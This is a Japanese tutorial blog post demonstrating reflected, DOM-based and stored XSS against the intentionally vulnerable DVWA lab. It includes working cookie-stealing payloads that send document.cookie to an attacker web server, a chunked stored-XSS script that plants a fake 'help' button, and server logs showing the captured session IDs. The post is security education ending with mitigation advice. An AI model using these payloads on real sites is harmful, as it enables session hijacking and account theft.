【脆弱性】XSS攻撃を実際にやってみたら、Cookieがダダ漏れに…！


# 概要

前回、以下の記事でSQLインジェクションを実際にやってみましたが、その他の有名な脆弱性として **XSS(クロスサイトスクリプティング)** があります。今回はDVWA（Damn Vulnerable Web Application）を使用してXSSを実践して理解を深めてみます。

https://qiita.com/shota0616/items/ef7125bcf5c2721c34b0

※DVWAの構築方法についても上記の記事で説明していますので、参考にしてみてください。

:::note warn
免責事項
DVWAはその名の通り脆弱なアプリケーションなので、サーバを侵害される可能性があります。インターネットに接続されたサーバーにアップロードしないでください。この手順を公開されているサーバで実験して侵害されたとしても一切責任は負えません。
また、この記事はあくまで脆弱性の対策を促すためのものなので、悪意を持って使用しないでください。
:::

# XSSについて

XSSは、Webサイトの脆弱性を利用して悪質なスクリプトを埋め込む攻撃手法です。XSSには主に3種類あります。

- Reflected XSS
- DOM Based XSS
- Stored XSS

## Reflected XSS

Reflected XSSはユーザが特定のリンクをクリックした際などに発生するもので、メールや他サイトを経由してユーザーに仕掛けられることが多いです。
悪意のあるスクリプトがリクエストに含まれ、それがサーバーのレスポンスに反映されてブラウザ上で実行されます。

### 攻撃手順

まずDVWAで`XSS (Reflected)`のメニューを開きます。

![スクリーンショット 2025-05-31 16.04.18.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/ccf4c0f5-f9af-4a61-95ef-0f8c1523b113.png)

ここで、What's your name?と聞かれているフォームにスクリプトを埋め込んでみます。
とりあえず以下のスクリプトを入力してalertが出てくるか確認してみましょう
```html
<script>alert('Reflected XSS')</script>
```
![スクリーンショット 2025-05-31 16.08.02.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/768ba4a0-3e7d-48ff-a9f5-56fba04b3af0.png)

すると上記のようにスクリプトが実行できてしまいました。
<font color="red">これを悪用すると、cookieに保存している内容を攻撃者に送信することができてしまいます。</font>

ということで、攻撃者が情報を受け取る方法は色々あるとは思いますが、今回はwebサーバで受け取ってみようと思います。（検証のためローカルにnginxを立てる）
http://localhost:8080

cookieの内容を含んで攻撃者が立てたwebサーバにアクセスさせれば良いので、以下のようなスクリプトを含んだリンクを踏ませることができれば情報を抜き取ることができてしまいます。
```html
<script>fetch("http://localhost:8080/?" + document.cookie);</script>
```
↓ 上記のスクリプトを含んだリンク
**http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%22http%3A%2F%2Flocalhost%3A8080%2F%3F%22+%2B+document.cookie%29%3B%3C%2Fscript%3E#**

これを押してしまうと攻撃者のwebサーバに以下のアクセスが送られてしまい。cookieに保存されていたsessionidなどが抜かれてしまいます。

```nginx
192.168.215.1 - - [31/May/2025:07:18:53 +0000] "GET /?PHPSESSID=5824979114356d4e2f76c5c0c95adbbf;%20security=low HTTP/1.1" 200 615 "http://127.0.0.1:4280/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
```
抜かれてしまったcookieの情報
```
PHPSESSID=5824979114356d4e2f76c5c0c95adbbf
security=low
```

上記の通り脆弱なwebアプリケーションでは<font color="red">**セッションの乗っ取り**</font>が容易にできてしまうことがわかりました。

## DOM Based XSS

DOM Based XSSもReflected XSSと同様に、悪意のあるスクリプトをブラウザ上で実行させる攻撃です。ただし、スクリプトが実行される仕組みが異なります。
DOM Based XSSはその名の通り、jsがDOMを介してHTMLを操作する際に発生するものです。Reflected XSSとの大きな違いは、必ずしもサーバーを介さず、クライアント側だけで完結する点です。（なのでサーバ側で検知しにくい）

### 攻撃手順

まずDVWAで`XSS (DOM)`のメニューを開きます。

![スクリーンショット 2025-06-03 22.17.30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/e439a51c-4ed7-4aa4-8d0e-f6f41746ec80.png)

開くとリンクは以下のようになっていますが、ここにスクリプトを埋め込みます。
http://127.0.0.1:4280/vulnerabilities/xss_d/?default=English

先ほど同様にとりあえず以下のスクリプトでalertが発動するか確認してみましょう。
```html
<script>alert('DOM Based XSS')</script>
```
**http://127.0.0.1:4280/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert('DOM%20Based%20XSS')%3C/script%3E**

![スクリーンショット 2025-06-03 22.41.46.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/2501c44c-6549-4e53-88cb-860f48ee135d.png)


alertが発動することが確認できました。続いて、cookieの内容を含んで攻撃者が立てたwebサーバにアクセスさせて先ほど同様にcookieに含んでいるセッションを奪取してみましょう。

```html
<script>new Image().src='http://localhost:8080/?cookie='+document.cookie</script>
```
↓ 上記のスクリプトを含んだリンク
**http://127.0.0.1:4280/vulnerabilities/xss_d/?default=English#%3Cscript%3Enew%20Image().src='http://localhost:8080/?cookie='+document.cookie%3C/script%3E**

```nginx
192.168.215.1 - - [03/Jun/2025:13:32:56 +0000] "GET /?cookie=security=low;%20PHPSESSID=55b51fbf98bb628a8a533b4269cc154a HTTP/1.1" 200 615 "http://127.0.0.1:4280/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
```

すると先ほど立てたwebサーバにアクセスが確認できました。そして、またしてもcookieの情報が抜き取られてしまいました。
```
security=low
PHPSESSID=55b51fbf98bb628a8a533b4269cc154a
```

## Stored XSS

Stored XSSは、ユーザの入力がサーバに保存され、後から他のユーザがその悪意あるスクリプトを含むデータを見ることで発動するタイプのXSSです。

### 攻撃手順

まずDVWAで`XSS (Stored)`のメニューを開きます。

![スクリーンショット 2025-06-03 22.43.31.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/5eb4262c-ec84-4ff7-81d7-cbc7aa1972c9.png)

続いてNameとMessageを以下のように入力して、`Sign Guestbook`を押下します。

|Name|Message|
| ---- | ---- |
|hogehoge|`<script>alert('Stored XSS');</script>`|

すると他のユーザがページを開いたときに以下のようにalertが発生してしまいます。

![スクリーンショット 2025-06-03 22.49.08.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/c411747c-773b-4cf6-b65c-5501b1d6c794.png)

どういう仕組みかというと、追加された投稿の`<script>alert('Stored XSS');</script>`の部分がそのまま格納されてしまっているため、投稿を表示すると以下のような形になります。それによってページを開いたほかのユーザでも以下のスクリプトが反映されてしまうということです。
```html
<div id="guestbook_comments">
    "Name: hogehoge"
    <br>
    "Message: "
    <script>alert('Stored XSS');</script>
    <br>
</div>
```

これを悪用すると上記2点のXSS同様にcookieを抜き取ることができます。以下の内容をMessageに入力して、`Sign Guestbook`を押下します。


```html
<script>
  // Cookie取得とエンコード
  d = document;
  k = d.cookie;
  ek = encodeURIComponent(k);
  u = "http://localhost:8080?k=" + ek;

  // ボタン作成
  i = d.createElement("input");
  i.type = "button";
  i.value = "help";
  i.style.marginLeft = "5px"
  i.onclick = function() {
    location.href = u;
  };

  // 'Clear Guestbook' ボタンのすぐ後ろに挿入
  clearBtn = d.querySelector('input[name="btnClear"]');
  clearBtn.parentNode.insertBefore(i, clearBtn.nextSibling);
</script>
```
そのままだと文字数制限(50文字)で入力できないので、以下のように複数行に分けて入力してきます。
```html
<script>d=document</script>
<script>k=d.cookie</script>
<script>ek=encodeURIComponent(k)</script>
<script>u="http://localhost:8080?k="+ek</script>
<script>i=d.createElement("input")</script>
<script>i.type="button"</script>
<script>i.value="help"</script>
<script>i.style.marginLeft="5px"</script>
<script>f=function(){location.href=u}</script>
<script>i.onclick=f</script>
<script>s="input[name='btnClear']"</script>
<script>b=d.querySelector(s)</script>
<script>p=b.parentNode</script>
<script>p.insertBefore(i,b.nextSibling)</script>
```

何ということでしょう、`Clear Guestbook`の右側に<font color="red">helpボタン</font>が追加されてしまいました。

![スクリーンショット 2025-06-04 8.04.31.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/b49e25b5-b9bd-407a-96a7-3a89080a28e2.png)

そして、このhelpボタンを押すと。。。

![スクリーンショット 2025-06-04 8.10.09.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/da1e538a-75d1-440d-a56b-78b2f2f050d0.png)

cookieの情報付きで攻撃者のサイトにアクセスしてしまいました。で、以下のようにログからcookieの情報を抜き取れました。

```nginx
192.168.215.1 - - [03/Jun/2025:22:27:18 +0000] "GET /?k=security%3Dlow%3B%20PHPSESSID%3D55b51fbf98bb628a8a533b4269cc154a HTTP/1.1" 200 615 "http://127.0.0.1:4280/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36" "-"
```
```
security=low
PHPSESSID=55b51fbf98bb628a8a533b4269cc154a
```

# 対策

一般的なXSSの対策として、サニタイジングがあります。サニタイジングはスクリプトの無害化のことで、入力内容をチェックして有害な文字をエスケープしたり、サーバ側で排除するというような対処のことです。
また、入力値の制御なども有効な手段ではあります。今回実施した内容で、文字数制限によりスクリプトを分割する必要がありましたが、そのような文字数制限があることで複雑なスクリプトを抑制できることがあります。

# まとめ

今回、実際に3種類のXSSでセッションハイジャックをやってみました。脆弱性のあるアプリケーションでは、いかに簡単に悪意のあるスクリプトを埋め込めるかわかりました。
IPAの`ソフトウェア等の脆弱性関連情報に関する届出状況[2025年第1四半期（1月～3月）]`によると、今までの累計ではXSSだけで57%を占めており、かなり多く報告されている脆弱性だとわかります。
この記事で紹介したような方法で実際にXSSを試すことができるので、脆弱性を作り込まないためにも一度実際にやってみてください。

https://www.ipa.go.jp/security/reports/vuln/software/2025q1.html
